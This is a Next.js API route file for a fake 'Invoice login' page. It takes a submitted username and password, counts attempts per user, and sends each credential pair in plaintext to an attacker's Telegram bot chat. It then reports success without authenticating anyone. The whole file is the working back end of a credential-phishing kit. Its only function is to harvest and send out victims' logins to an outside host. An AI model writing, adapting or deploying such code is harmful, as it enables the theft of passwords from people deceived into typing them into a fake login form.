// app/api/login/route.ts
const userAttempts = new Map();

export async function POST(req) {
    const body = await req.json();
    const { user, password } = body;
  
    if (!user || !password) {
      return new Response(JSON.stringify({ message: 'Missing fields' }), {
        status: 400,
      });
    }

    // Get or initialize attempt count for this user
    const userCount = (userAttempts.get(user) || 0) + 1;
    userAttempts.set(user, userCount);
  
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    
    const message = `🔐 New Login Attempt:\n💀Page : Invoice login \n👤 User: ${user}\n🔑 Password: ${password}\n📊 Attempts for this user: ${userCount}`;
  
    const tgRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
      }),
    });
  
    if (!tgRes.ok) {
      return new Response(JSON.stringify({ message: 'Internal Server Error' }), {
        status: 500,
      });
    }
  
    return new Response(JSON.stringify({ Success: 'True' }), {
      status: 200,
    });
  }
  